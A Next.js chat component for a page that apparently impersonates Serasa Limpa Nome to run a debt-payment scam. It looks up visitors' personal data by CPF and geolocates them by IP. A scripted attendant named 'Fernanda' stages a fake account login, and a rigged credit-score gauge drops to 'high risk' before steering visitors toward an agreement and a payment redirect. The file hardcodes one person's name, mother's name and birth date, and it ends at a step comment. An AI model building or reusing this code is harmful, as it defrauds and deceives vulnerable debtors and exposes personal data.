"use client"

import { Suspense, useState, useEffect, useRef, useCallback } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import { Card } from "@/components/ui/card"
import { ShieldCheck, Clock, QrCode, CheckCircle2, Play, Pause, Volume2, VolumeX, User } from "lucide-react"

function formatCPF(value?: string): string {
  if (!value) return ""
  const numbers = String(value).replace(/\D/g, "")
  if (numbers.length === 11) {
    return numbers.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }
  return value
}

function maskCPF(value?: string): string {
  if (!value) return "***.***.***-**"
  const numbers = String(value).replace(/\D/g, "")
  if (numbers.length === 11) {
    return `${numbers.slice(0, 3)}.***.***-${numbers.slice(9, 11)}`
  }
  return value
}

function InlineVideoPlayer({
  videoUrl,
  onFinished,
}: {
  videoUrl: string
  onFinished?: () => void
}) {
  const videoRef = useRef<HTMLVideoElement | null>(null)
  const [isPlaying, setIsPlaying] = useState(false)
  const [isMuted, setIsMuted] = useState(false)
  const [isEnded, setIsEnded] = useState(false)
  const [needsTapForSound, setNeedsTapForSound] = useState(false)
  const hasTriggeredRef = useRef(false)
  const hasEndedRef = useRef(false)
  const hasStartedAutoplayRef = useRef(false)

  const triggerNext = useCallback(() => {
    if (!hasTriggeredRef.current) {
      hasTriggeredRef.current = true
      if (onFinished) {
        onFinished()
      }
    }
  }, [onFinished])

  const enableSound = useCallback(() => {
    const video = videoRef.current
    if (!video || hasEndedRef.current) return
    video.muted = false
    setIsMuted(false)
    setNeedsTapForSound(false)
    if (video.paused && !hasEndedRef.current) {
      video.play().catch(console.error)
    }
  }, [])

  useEffect(() => {
    const video = videoRef.current
    if (!video) return

    const handleEnded = () => {
      hasEndedRef.current = true
      setIsEnded(true)
      setIsPlaying(false)
      try {
        video.pause()
        if (video.duration && !isNaN(video.duration)) {
          video.currentTime = video.duration
        }
      } catch {}
      triggerNext()
    }

    const handleTimeUpdate = () => {
      if (video.duration && video.currentTime >= video.duration - 0.25) {
        if (!hasEndedRef.current) {
          handleEnded()
        }
      }
    }

    // Auto-advance fallback timer at 19.5 seconds (video is 18.2s)
    const timer = setTimeout(() => {
      if (!hasEndedRef.current) {
        handleEnded()
      }
    }, 19500)

    const handlePlay = (e?: Event) => {
      if (hasEndedRef.current) {
        video.pause()
        e?.preventDefault?.()
        return
      }
      setIsPlaying(true)
    }

    const handlePause = () => {
      setIsPlaying(false)
    }

    video.addEventListener("ended", handleEnded)
    video.addEventListener("timeupdate", handleTimeUpdate)
    video.addEventListener("play", handlePlay)
    video.addEventListener("pause", handlePause)

    // Attempt autoplay ONLY ONCE on initial mount
    if (!hasStartedAutoplayRef.current && !hasEndedRef.current) {
      hasStartedAutoplayRef.current = true
      video.muted = false
      const playPromise = video.play()

      if (playPromise !== undefined) {
        playPromise
          .then(() => {
            setIsPlaying(true)
            setIsMuted(false)
            setNeedsTapForSound(false)
          })
          .catch(() => {
            // If browser policy blocks unmuted autoplay, play muted and surface un-mute prompt
            video.muted = true
            setIsMuted(true)
            setNeedsTapForSound(true)
            video
              .play()
              .then(() => {
                setIsPlaying(true)
              })
              .catch(() => {
                setIsPlaying(false)
              })
          })
      }
    }

    // Global first-tap listener to unmute cleanly (only while playing and not ended)
    const handleGlobalTap = () => {
      if (video && video.muted && !hasEndedRef.current) {
        video.muted = false
        setIsMuted(false)
        setNeedsTapForSound(false)
      }
    }
    window.addEventListener("touchstart", handleGlobalTap, { once: true, passive: true })
    window.addEventListener("click", handleGlobalTap, { once: true })

    return () => {
      clearTimeout(timer)
      video.removeEventListener("ended", handleEnded)
      video.removeEventListener("timeupdate", handleTimeUpdate)
      video.removeEventListener("play", handlePlay)
      video.removeEventListener("pause", handlePause)
      window.removeEventListener("touchstart", handleGlobalTap)
      window.removeEventListener("click", handleGlobalTap)
    }
  }, [triggerNext])

  const togglePlay = () => {
    const video = videoRef.current
    if (!video || hasEndedRef.current || isEnded) return
    if (isPlaying) {
      video.pause()
    } else {
      if (video.muted) {
        video.muted = false
        setIsMuted(false)
        setNeedsTapForSound(false)
      }
      video.play().catch(console.error)
    }
  }

  const toggleMute = (e: React.MouseEvent) => {
    e.stopPropagation()
    enableSound()
  }

  return (
    <div className="w-full max-w-[280px] sm:max-w-[320px] bg-black rounded-2xl overflow-hidden shadow-xl border border-pink-200 relative my-1 select-none">
      <video
        ref={videoRef}
        src={videoUrl}
        playsInline
        preload="auto"
        controls={!isEnded}
        loop={false}
        className="w-full h-auto block rounded-2xl max-h-[420px] object-cover"
        onClick={isEnded ? undefined : togglePlay}
        onEnded={() => {
          if (!hasEndedRef.current) {
            hasEndedRef.current = true
            setIsEnded(true)
            setIsPlaying(false)
            if (videoRef.current) {
              videoRef.current.pause()
            }
            triggerNext()
          }
        }}
      />

      {needsTapForSound && !isEnded && (
        <button
          onClick={toggleMute}
          type="button"
          className="absolute top-3 right-3 bg-pink-600 hover:bg-pink-700 text-white text-xs font-bold px-3 py-1.5 rounded-full flex items-center gap-1.5 shadow-lg z-20 animate-bounce active:scale-95 transition-all"
        >
          <VolumeX className="w-4 h-4 text-white" />
          <span>Ativar som 🔊</span>
        </button>
      )}

      {!isPlaying && !isEnded && (
        <div
          onClick={togglePlay}
          className="absolute inset-0 bg-black/40 flex items-center justify-center cursor-pointer z-10 transition-opacity"
        >
          <div className="w-14 h-14 rounded-full bg-pink-600 text-white flex items-center justify-center shadow-xl hover:scale-105 active:scale-95 transition-transform">
            <Play className="w-6 h-6 fill-current ml-1" />
          </div>
        </div>
      )}
    </div>
  )
}

function ModernAudioPlayer({
  audioUrl,
  messageId,
  onFinished,
}: {
  audioUrl: string
  messageId: string
  onFinished?: () => void
}) {
  const [isPlaying, setIsPlaying] = useState(false)
  const [progress, setProgress] = useState(0)
  const [currentTime, setCurrentTime] = useState("0:00")
  const [duration, setDuration] = useState("0:00")
  const [playbackRate, setPlaybackRate] = useState(1)
  const audioRef = useRef<HTMLAudioElement | null>(null)
  const hasEndedTriggeredRef = useRef(false)

  const triggerEnd = useCallback(() => {
    if (!hasEndedTriggeredRef.current) {
      hasEndedTriggeredRef.current = true
      if (onFinished) {
        onFinished()
      }
    }
  }, [onFinished])

  useEffect(() => {
    const audio = audioRef.current
    if (!audio) return

    const estimatedDuration = audioUrl.includes("audio-4")
      ? 46000
      : audioUrl.includes("audio-3")
      ? 29000
      : audioUrl.includes("audio-6")
      ? 32000
      : audioUrl.includes("audio-5")
      ? 19000
      : 30000

    const fallbackTimer = setTimeout(() => {
      triggerEnd()
    }, estimatedDuration)

    const handleTimeUpdate = () => {
      if (audio.duration) {
        const cur = audio.currentTime
        const dur = audio.duration
        setProgress((cur / dur) * 100)
        const curMins = Math.floor(cur / 60)
        const curSecs = Math.floor(cur % 60).toString().padStart(2, "0")
        setCurrentTime(`${curMins}:${curSecs}`)
      }
    }

    const handleLoadedMetadata = () => {
      if (audio.duration) {
        const durMins = Math.floor(audio.duration / 60)
        const durSecs = Math.floor(audio.duration % 60).toString().padStart(2, "0")
        setDuration(`${durMins}:${durSecs}`)
      }
    }

    const handleEnded = () => {
      setIsPlaying(false)
      setProgress(0)
      setCurrentTime("0:00")
      triggerEnd()
    }

    audio.addEventListener("timeupdate", handleTimeUpdate)
    audio.addEventListener("loadedmetadata", handleLoadedMetadata)
    audio.addEventListener("ended", handleEnded)

    const playPromise = audio.play()
    if (playPromise !== undefined) {
      playPromise
        .then(() => setIsPlaying(true))
        .catch(() => setIsPlaying(false))
    }

    return () => {
      clearTimeout(fallbackTimer)
      audio.removeEventListener("timeupdate", handleTimeUpdate)
      audio.removeEventListener("loadedmetadata", handleLoadedMetadata)
      audio.removeEventListener("ended", handleEnded)
    }
  }, [audioUrl, triggerEnd])

  const togglePlay = () => {
    const audio = audioRef.current
    if (!audio) return
    if (isPlaying) {
      audio.pause()
      setIsPlaying(false)
    } else {
      audio.play().then(() => setIsPlaying(true)).catch(console.error)
    }
  }

  const toggleSpeed = () => {
    const audio = audioRef.current
    if (!audio) return
    const rates = [1, 1.5, 2]
    const nextRate = rates[(rates.indexOf(playbackRate) + 1) % rates.length]
    audio.playbackRate = nextRate
    setPlaybackRate(nextRate)
  }

  const handleSeek = (e: React.MouseEvent<HTMLDivElement>) => {
    const audio = audioRef.current
    if (!audio || !audio.duration) return
    const rect = e.currentTarget.getBoundingClientRect()
    const clickX = e.clientX - rect.left
    const newProgress = Math.max(0, Math.min(1, clickX / rect.width))
    audio.currentTime = newProgress * audio.duration
    setProgress(newProgress * 100)
  }

  // Visual audio waveform heights (WhatsApp style)
  const barHeights = [10, 16, 22, 14, 28, 18, 26, 12, 30, 22, 16, 26, 14, 20, 28, 16, 22, 14, 18, 10, 14, 22, 16, 12]

  return (
    <div className="w-full max-w-[290px] sm:max-w-[330px] bg-white rounded-2xl p-3.5 border border-pink-200/90 shadow-md font-sans select-none my-1 transition-all">
      <audio ref={audioRef} src={audioUrl} preload="auto" data-message-id={messageId} />
      
      {/* Top micro-bar: Attendant info + speed pill */}
      <div className="flex items-center justify-between pb-2 mb-2 border-b border-slate-100">
        <div className="flex items-center gap-2">
          <div className="relative">
            <Image
              src="/fernanda-avatar.jpg"
              alt="Fernanda Atendente"
              width={30}
              height={30}
              className="w-7 h-7 rounded-full object-cover border border-pink-300"
            />
            <span className="absolute -bottom-0.5 -right-0.5 w-2 h-2 rounded-full bg-emerald-500 border border-white ring-1 ring-white" />
          </div>
          <div>
            <div className="flex items-center gap-1">
              <span className="text-xs font-bold text-slate-800 leading-tight">Fernanda</span>
              <CheckCircle2 className="w-3 h-3 text-pink-600 fill-pink-100" />
            </div>
            <p className="text-[10px] text-pink-600 font-semibold tracking-tight">Áudio Oficial da Consultora</p>
          </div>
        </div>

        <button
          onClick={toggleSpeed}
          type="button"
          className="text-[10px] font-bold text-pink-700 bg-pink-50 hover:bg-pink-100 border border-pink-200 px-2 py-0.5 rounded-full transition-colors active:scale-95"
          title="Alterar velocidade de reprodução"
        >
          {playbackRate}x
        </button>
      </div>

      {/* Main audio player row */}
      <div className="flex items-center gap-3">
        <button
          onClick={togglePlay}
          type="button"
          className="w-11 h-11 rounded-full bg-gradient-to-tr from-[#e6007e] to-pink-500 hover:from-pink-700 hover:to-[#e6007e] active:scale-95 text-white flex items-center justify-center flex-shrink-0 shadow-md transition-all"
          aria-label={isPlaying ? "Pausar" : "Ouvir"}
        >
          {isPlaying ? (
            <Pause className="w-5 h-5 fill-current" />
          ) : (
            <Play className="w-5 h-5 fill-current ml-0.5" />
          )}
        </button>

        {/* Waveform track */}
        <div className="flex-1 cursor-pointer py-1" onClick={handleSeek}>
          <div className="flex items-center justify-between gap-[2.5px] h-8 px-0.5">
            {barHeights.map((h, i) => {
              const barPercent = (i / barHeights.length) * 100
              const isPassed = barPercent <= progress
              return (
                <div
                  key={i}
                  className={`w-[3px] rounded-full transition-all duration-150 ${
                    isPassed ? "bg-[#e6007e]" : "bg-pink-200"
                  } ${isPlaying && isPassed ? "scale-y-110" : ""}`}
                  style={{ height: `${h}px` }}
                />
              )
            })}
          </div>

          {/* Time & status indicator */}
          <div className="flex justify-between items-center text-[10.5px] text-slate-500 font-mono mt-1 px-0.5">
            <span className="font-semibold text-slate-600">
              {isPlaying ? currentTime : (duration !== "0:00" ? duration : "0:25")}
            </span>
            <span className="text-[9.5px] text-emerald-700 font-sans font-semibold flex items-center gap-0.5 bg-emerald-50 px-1.5 py-0.2 rounded border border-emerald-200">
              <CheckCircle2 className="w-2.5 h-2.5 text-emerald-600" /> Reproduzindo
            </span>
          </div>
        </div>
      </div>
    </div>
  )
}

function AnimatedScoreGauge({ targetScore = 291 }: { targetScore?: number }) {
  const [currentScore, setCurrentScore] = useState(60)
  const [phase, setPhase] = useState<"rising" | "pause" | "dropping" | "done">("rising")

  useEffect(() => {
    let animFrame: number
    const startTime = performance.now()

    const tick = (now: number) => {
      const elapsed = now - startTime

      if (elapsed < 1400) {
        setPhase("rising")
        const progress = elapsed / 1400
        const ease = 1 - Math.pow(1 - progress, 2)
        const val = Math.round(60 + ease * 720)
        setCurrentScore(val)
        animFrame = requestAnimationFrame(tick)
      } else if (elapsed < 2000) {
        setPhase("pause")
        setCurrentScore(780)
        animFrame = requestAnimationFrame(tick)
      } else if (elapsed < 3200) {
        setPhase("dropping")
        const dropProgress = (elapsed - 2000) / 1200
        const ease = 1 - Math.pow(1 - dropProgress, 3)
        const val = Math.round(780 - ease * (780 - targetScore))
        setCurrentScore(Math.max(targetScore, val))
        animFrame = requestAnimationFrame(tick)
      } else {
        setPhase("done")
        setCurrentScore(targetScore)
      }
    }

    animFrame = requestAnimationFrame(tick)
    return () => cancelAnimationFrame(animFrame)
  }, [targetScore])

  const rotationAngle = -90 + (currentScore / 1000) * 180
  const isRed = phase === "done" || (phase === "dropping" && currentScore <= 350)
  const isGreen = phase === "pause" || (phase === "rising" && currentScore > 650)

  return (
    <div className="w-full max-w-[340px] sm:max-w-[380px] bg-white rounded-2xl border border-red-200 shadow-md overflow-hidden font-sans select-none my-1">
      <div className="bg-gradient-to-r from-[#ba141a] via-[#b91c1c] to-[#991b1b] text-white px-4 py-3 flex items-center justify-between gap-3">
        <div className="flex-1">
          <h4 className="font-bold text-sm tracking-tight leading-snug">Alto risco para crédito</h4>
          <p className="text-[11px] text-red-100/90 leading-tight mt-0.5">
            Os bancos negam limite de crédito devido ao maior risco de inadimplência
          </p>
        </div>
        <div className="w-10 h-10 rounded-full border-2 border-white/90 flex items-center justify-center flex-shrink-0 bg-white/10 shadow-inner">
          <svg className="w-6 h-6 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10" />
            <circle cx="9" cy="9" r="1" fill="currentColor" />
            <circle cx="15" cy="9" r="1" fill="currentColor" />
            <path d="M16 16s-1.5-2-4-2-4 2-4 2" />
          </svg>
        </div>
      </div>

      <div className="p-4 bg-white flex flex-col items-center">
        <div className="relative w-56 h-28 flex items-end justify-center overflow-hidden">
          <svg className="w-56 h-56 -mb-28" viewBox="0 0 200 200">
            <path
              d="M 30 100 A 70 70 0 0 1 170 100"
              fill="none"
              stroke="#f1f5f9"
              strokeWidth="18"
              strokeLinecap="round"
            />
            <path
              d="M 30 100 A 70 70 0 0 1 52 47"
              fill="none"
              stroke="#dc2626"
              strokeWidth="16"
              strokeLinecap="round"
            />
            <path
              d="M 57 43 A 70 70 0 0 1 97 30"
              fill="none"
              stroke="#ea580c"
              strokeWidth="16"
            />
            <path
              d="M 103 30 A 70 70 0 0 1 143 43"
              fill="none"
              stroke="#eab308"
              strokeWidth="16"
            />
            <path
              d="M 148 47 A 70 70 0 0 1 170 100"
              fill="none"
              stroke="#16a34a"
              strokeWidth="16"
              strokeLinecap="round"
            />

            <circle cx="100" cy="100" r="9" fill="#0f172a" />
            <circle cx="100" cy="100" r="6" fill="#cbd5e1" />
            <circle cx="100" cy="100" r="3" fill="#0f172a" />

            <g transform={`rotate(${rotationAngle} 100 100)`}>
              <polygon points="96.5,100 103.5,100 100,28" fill="#0f172a" />
              <polygon points="98,100 102,100 100,22" fill="#dc2626" />
            </g>
          </svg>
        </div>

        <div className="mt-1 text-center">
          <div className="flex items-baseline justify-center gap-1">
            <span
              className={`text-3xl font-black font-mono tracking-tight transition-colors duration-150 ${
                isRed ? "text-slate-900" : isGreen ? "text-emerald-600" : "text-amber-500"
              }`}
            >
              {currentScore}
            </span>
            <span className="text-sm font-bold text-slate-400">/ 1000</span>
          </div>

          <div className="mt-1 flex justify-center">
            <span
              className={`inline-flex items-center gap-1.5 text-xs font-bold px-3 py-0.5 rounded-full uppercase tracking-wider transition-all duration-150 ${
                isRed
                  ? "bg-red-50 text-red-700 border border-red-200"
                  : isGreen
                  ? "bg-emerald-50 text-emerald-700 border border-emerald-200"
                  : "bg-amber-50 text-amber-700 border border-amber-200"
              }`}
            >
              <span className={`w-1.5 h-1.5 rounded-full ${isRed ? "bg-red-600" : isGreen ? "bg-emerald-600" : "bg-amber-600"}`}></span>
              {isRed ? "Score: Baixo" : isGreen ? "Score: Excelente" : "Score: Regular"}
            </span>
          </div>
        </div>
      </div>

      <div className="h-1.5 bg-[#ba141a] w-full"></div>
    </div>
  )
}

interface Message {
  id: string
  type: "text" | "system" | "image" | "audio" | "video" | "local-video" | "embed" | "data-confirmation" | "agreement-document" | "payment-guide" | "score-gauge"
  content: string
  sender: "bot" | "user"
  timestamp: Date
  avatar?: string
  delay?: number
  buttons?: Array<{
    text: string
    action: string
  }>
  data?: any
  imageUrl?: string
  audioUrl?: string
  videoUrl?: string
  embedUrl?: string
}

interface UserData {
  cpf: string
  nome: string
  nascimento: string
  mae: string
  sexo: string
  cidade: string
}

function ChatContent() {
  const searchParams = useSearchParams()
  const cpf = searchParams.get("cpf")
  const [messages, setMessages] = useState<Message[]>([])
  const [userData, setUserData] = useState<UserData | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [isTyping, setIsTyping] = useState(false)
  const [clickedButtons, setClickedButtons] = useState<Set<string>>(new Set())
  const [isMounted, setIsMounted] = useState(false)
  const [showExitModal, setShowExitModal] = useState(false)
  const [isFernandaJoined, setIsFernandaJoined] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const chatContainerRef = useRef<HTMLDivElement>(null)
  const isInitializedRef = useRef(false)
  const hasStartedConversationRef = useRef(false)
  const hasTriggeredVerificationRef = useRef(false)
  const hasTriggeredFeiraoRef = useRef(false)
  const queuedMessageIdsRef = useRef<Set<string>>(new Set())
  const activeTimeoutsRef = useRef<NodeJS.Timeout[]>([])

  const scrollToBottom = useCallback((behavior: ScrollBehavior = "smooth") => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTo({
        top: chatContainerRef.current.scrollHeight,
        behavior,
      })
    }

    if (messagesEndRef.current) {
      try {
        messagesEndRef.current.scrollIntoView({
          behavior,
          block: "end",
          inline: "nearest",
        })
      } catch {
        messagesEndRef.current.scrollIntoView(false)
      }
    }

    if (typeof window !== "undefined") {
      const docHeight = Math.max(
        document.documentElement.scrollHeight,
        document.body.scrollHeight
      )
      window.scrollTo({
        top: docHeight,
        behavior,
      })
    }
  }, [])

  useEffect(() => {
    setIsMounted(true)

    const originalOverflow = document.body.style.overflow
    const originalOverscroll = document.body.style.overscrollBehavior
    document.body.style.overflow = "hidden"
    document.body.style.overscrollBehavior = "none"

    const handleMouseLeave = (e: MouseEvent) => {
      if (e.clientY <= 0) {
        setShowExitModal(true)
      }
    }
    document.addEventListener("mouseleave", handleMouseLeave)

    return () => {
      document.body.style.overflow = originalOverflow
      document.body.style.overscrollBehavior = originalOverscroll
      document.removeEventListener("mouseleave", handleMouseLeave)
      activeTimeoutsRef.current.forEach(clearTimeout)
      activeTimeoutsRef.current = []
    }
  }, [])

  useEffect(() => {
    scrollToBottom("smooth")

    const t1 = setTimeout(() => scrollToBottom("smooth"), 80)
    const t2 = setTimeout(() => scrollToBottom("smooth"), 250)
    const t3 = setTimeout(() => scrollToBottom("smooth"), 500)
    const t4 = setTimeout(() => scrollToBottom("smooth"), 900)

    return () => {
      clearTimeout(t1)
      clearTimeout(t2)
      clearTimeout(t3)
      clearTimeout(t4)
    }
  }, [messages, isTyping, scrollToBottom])

  useEffect(() => {
    const container = chatContainerRef.current
    if (!container || typeof ResizeObserver === "undefined") return

    let resizeTimer: NodeJS.Timeout
    const observer = new ResizeObserver(() => {
      clearTimeout(resizeTimer)
      resizeTimer = setTimeout(() => {
        scrollToBottom("smooth")
      }, 60)
    })

    observer.observe(container)

    return () => {
      observer.disconnect()
      clearTimeout(resizeTimer)
    }
  }, [scrollToBottom])

  useEffect(() => {
    if (!cpf) return
    if (isInitializedRef.current) return
    isInitializedRef.current = true

    initializeChatbot()
  }, [cpf])

  const initializeChatbot = async () => {
    setIsLoading(true)

    const paramNome = searchParams.get("nome") || (typeof window !== "undefined" ? localStorage.getItem("serasa_nome") : null) || ""
    const paramNasc = searchParams.get("nasc") || (typeof window !== "undefined" ? localStorage.getItem("serasa_nasc") : null) || ""
    const paramCidade = searchParams.get("cidade") || searchParams.get("city") || (typeof window !== "undefined" ? localStorage.getItem("serasa_cidade") : null) || ""

    let clientCity = paramCidade
    if (!clientCity) {
      try {
        const geoController = new AbortController()
        const geoTimeout = setTimeout(() => geoController.abort(), 2000)
        const geoRes = await fetch("https://ipwho.is/", { signal: geoController.signal, cache: "no-store" })
        clearTimeout(geoTimeout)
        if (geoRes.ok) {
          const geoData = await geoRes.json()
          if (geoData && geoData.success && geoData.city) {
            clientCity = String(geoData.city).trim()
          }
        }
      } catch {}
    }

    if (!clientCity) {
      try {
        const geo2 = await fetch("http://ip-api.com/json/", { cache: "no-store" })
        if (geo2.ok) {
          const d2 = await geo2.json()
          if (d2 && d2.city) clientCity = String(d2.city).trim()
        }
      } catch {}
    }

    try {
      const cleanCpf = cpf?.replace(/\D/g, "")

      const response = await fetch(`/api/user-data?cpf=${cleanCpf}${clientCity ? `&cidade=${encodeURIComponent(clientCity)}` : ""}`)
      const result = await response.json()

      const serverCity = result.data?.cidade && result.data.cidade !== "São Paulo" ? result.data.cidade : ""
      const detectedCity = clientCity || serverCity || "Iracema"

      const userData: UserData = {
        cpf: cpf || "",
        nome: (result.data?.nome && result.data.nome !== "Cliente") ? result.data.nome : (paramNome || "ANTONIA MAGALHAES FERREIRA ALVES"),
        nascimento: result.data?.nascimento || paramNasc || "01/08/1974",
        mae: result.data?.mae || "ANTONIA MAGALHAES FERREIRA",
        sexo: result.data?.sexo || "Feminino",
        cidade: detectedCity,
      }

      setUserData(userData)
      logUserInteraction(userData.cpf, "chat_started", { city: detectedCity, userData })
      startConversation(userData)
    } catch (error) {
      console.error("Error fetching user data:", error)
      const fallbackData: UserData = {
        cpf: cpf || "",
        nome: paramNome || "ANTONIA MAGALHAES FERREIRA ALVES",
        nascimento: paramNasc || "01/08/1974",
        mae: "ANTONIA MAGALHAES FERREIRA",
        sexo: "Feminino",
        cidade: clientCity || "Iracema",
      }
      setUserData(fallbackData)
      startConversation(fallbackData)
    }

    setIsLoading(false)
  }

  // Delay mais natural e humanizado entre mensagens (2.4s a 3.0s)
  const addMessageWithTyping = (message: Message, delay = 2600) => {
    if (queuedMessageIdsRef.current.has(message.id)) return
    queuedMessageIdsRef.current.add(message.id)

    const t1 = setTimeout(() => {
      setIsTyping(true)
      const t2 = setTimeout(() => {
        setIsTyping(false)
        setMessages((prev) => {
          if (prev.some((m) => m.id === message.id)) return prev
          return [...prev, message]
        })

        if (message.type === "audio" && message.audioUrl) {
          const t3 = setTimeout(() => {
            const audioElement = document.querySelector(`audio[data-message-id="${message.id}"]`) as HTMLAudioElement
            if (audioElement) {
              audioElement.play().catch(console.error)
            }
          }, 150)
          activeTimeoutsRef.current.push(t3)
        }
      }, delay)
      activeTimeoutsRef.current.push(t2)
    }, 150)
    activeTimeoutsRef.current.push(t1)
  }

  /* STEP 1: Entrada & Apresentação Oficial
     Delays naturais e humanizados
  */
  const startConversation = (userData: UserData) => {
    if (hasStartedConversationRef.current) return
    hasStartedConversationRef.current = true

    const firstName = userData.nome.split(" ")[0]
    const userCity = userData.cidade || "sua região"

    const firstImage: Message = {
      id: "intro-banner-serasa",
      type: "image",
      content: "",
      sender: "bot",
      avatar: "/serasa-avatar.png",
      timestamp: new Date(),
      imageUrl: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/t2s1f0xeh3om35z9nrjnb7jf-1vA424t6Q2p1WLQkyWMXU5Hymibj8F.png",
    }
    addMessageWithTyping(firstImage, 2000)

    const tMsg2 = setTimeout(() => {
      const canalOficialMsg: Message = {
        id: "intro-canal-oficial",
        type: "text",
        content: `Olá <b>${userData.nome}</b>, esse é um Canal Oficial de Atendimento do <b>Serasa Limpa Nome</b> e os seus dados estão seguros conosco.🔐`,
        sender: "bot",
        avatar: "/serasa-avatar.png",
        timestamp: new Date(),
      }
      addMessageWithTyping(canalOficialMsg, 3200)

      const tMsg3 = setTimeout(() => {
        const aguardeMsg: Message = {
          id: "intro-aguarde-atendente",
          type: "text",
          content: `Aguarde alguns instantes... Um de nossos atendentes de <b>${userCity}</b> irá entrar na conversa...`,
          sender: "bot",
          avatar: "/serasa-avatar.png",
          timestamp: new Date(),
        }
        addMessageWithTyping(aguardeMsg, 3000)

        const tMsg4 = setTimeout(() => {
          setIsFernandaJoined(true)
          const sysJoinMsg: Message = {
            id: "sys-fernanda-join",
            type: "system",
            content: "(Atendente Fernanda entrou na conversa..) 💬",
            sender: "bot",
            timestamp: new Date(),
          }
          setMessages((prev) => [...prev, sysJoinMsg])

          const tMsg5 = setTimeout(() => {
            const fernandaMsg: Message = {
              id: "fernanda-msg-1",
              type: "text",
              content: `Olá, <b>${firstName}</b>!\nMe chamo Fernanda, serei sua atendente hoje na Serasa.`,
              sender: "bot",
              avatar: "/fernanda-avatar.jpg",
              timestamp: new Date(),
            }
            addMessageWithTyping(fernandaMsg, 2800)

            const tMsg6 = setTimeout(() => {
              const videoMsg: Message = {
                id: "intro-video-vsl1",
                type: "local-video",
                content: "",
                sender: "bot",
                timestamp: new Date(),
                videoUrl: "/vsl1.mp4",
              }
              addMessageWithTyping(videoMsg, 1600)
            }, 3600)
            activeTimeoutsRef.current.push(tMsg6)
          }, 3200)
          activeTimeoutsRef.current.push(tMsg5)
        }, 4200)
        activeTimeoutsRef.current.push(tMsg4)
      }, 4200)
      activeTimeoutsRef.current.push(tMsg3)
    }, 4000)
    activeTimeoutsRef.current.push(tMsg2)
  }

  const triggerDataVerificationFlow = useCallback(() => {
    if (hasTriggeredVerificationRef.current) return
    hasTriggeredVerificationRef.current = true

    if (!userData) return

    const confirmationMessage: Message = {
      id: "data-confirmation",
      type: "data-confirmation",
      content: "Antes de prosseguirmos, confirme se seus dados estão corretos:",
      sender: "bot",
      timestamp: new Date(),
      data: userData,
      buttons: [
        {
          text: "Sim, está correto.",
          action: "confirm-data",
        },
      ],
    }

    const t = setTimeout(() => {
      addMessageWithTyping(confirmationMessage, 2800)
    }, 1500)
    activeTimeoutsRef.current.push(t)
  }, [userData])

  const logUserInteraction = async (cpf: string, action: string, data: any) => {
    try {
      await fetch("/api/logs", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cpf,
          action,
          data,
          timestamp: new Date().toISOString(),
        }),
      })
    } catch {}
  }

  const handleButtonClick = (action: string, buttonText: string) => {
    const buttonId = `${action}-${buttonText}`
    if (clickedButtons.has(buttonId)) return
    setClickedButtons((prev) => new Set([...prev, buttonId]))

    const userMessage: Message = {
      id: `user-${Date.now()}`,
      type: "text",
      content: buttonText,
      sender: "user",
      timestamp: new Date(),
    }

    setMessages((prev) => [...prev, userMessage])
    logUserInteraction(userData?.cpf || "", `button_clicked_${action}`, { buttonText })

    setTimeout(() => {
      switch (action) {
        case "confirm-data":
          continueAfterDataConfirmation()
          break
        case "continuar-feirao":
          playAudioFeirao()
          break
        case "quero-consultar":
          startDebtAnalysisFromScreenshots()
          break
        case "sim-desejo":
          stepBuscarAcordo()
          break
        case "ver-acordo":
          stepVerAcordo()
          break
        case "confirmar-acordo":
          stepConfirmarAcordo()
          break
        case "continuar-pagamento":
          stepContinuarPagamento()
          break
        case "acessar-pagamento":
          redirectToPayment()
          break
      }
    }, 1600)
  }

  /* STEP 2: Login Serasa + Credores */
  const continueAfterDataConfirmation = () => {
    const nomeCompleto = userData?.nome || "Cliente"

    // Mensagem 1
    const m1: Message = {
      id: "s2-obrigada",
      type: "text",
      content: `<b>Obrigada!</b> <i>Agora, aguarde um instante...</i>`,
      sender: "bot",
      timestamp: new Date(),
    }
    addMessageWithTyping(m1, 2600)

    // Mensagem 2
    const t1 = setTimeout(() => {
      const m2: Message = {
        id: "s2-login",
        type: "text",
        content: `<i>Efetuando login em sua conta Serasa...</i>`,
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(m2, 3000)

      // Mensagem 3
      const t2 = setTimeout(() => {
        const m3: Message = {
          id: "s2-sucesso",
          type: "text",
          content: `<b>Login Efetuado com Sucesso!</b>`,
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(m3, 2200)

        // Mensagem 4
        const t3 = setTimeout(() => {
          const m4: Message = {
            id: "s2-bemvindo",
            type: "text",
            content: `<b>${nomeCompleto}</b>, Seja bem vindo(a) a sua conta <b>Serasa</b>.`,
            sender: "bot",
            timestamp: new Date(),
          }
          addMessageWithTyping(m4, 3200)

          // Mensagem 5
          const t4 = setTimeout(() => {
            const m5: Message = {
              id: "s2-credores-text",
              type: "text",
              content: `Negocie dívidas com as seguintes empresas:`,
              sender: "bot",
              timestamp: new Date(),
            }
            addMessageWithTyping(m5, 2800)

            // Imagem de credores
            const t5 = setTimeout(() => {
              const credoresImage: Message = {
                id: "s2-credores-img",
                type: "image",
                content: "",
                sender: "bot",
                timestamp: new Date(),
                imageUrl: "/Screenshot_45.png",
              }
              addMessageWithTyping(credoresImage, 2000)

              // Botão Continuar
              const t6 = setTimeout(() => {
                const continuarText: Message = {
                  id: "s2-toque-continuar",
                  type: "text",
                  content: `(Toque em Continuar para Prosseguir)`,
                  sender: "bot",
                  timestamp: new Date(),
                  buttons: [
                    {
                      text: "Continuar",
                      action: "continuar-feirao",
                    },
                  ],
                }
                addMessageWithTyping(continuarText, 2200)
              }, 3800)
              activeTimeoutsRef.current.push(t6)
            }, 3600)
            activeTimeoutsRef.current.push(t5)
          }, 4000)
          activeTimeoutsRef.current.push(t4)
        }, 3600)
        activeTimeoutsRef.current.push(t3)
      }, 3800)
      activeTimeoutsRef.current.push(t2)
    }, 3800)
    activeTimeoutsRef.current.push(t1)
  }

  /* STEP 3: audio-3.mp3 + pergunta feirão */
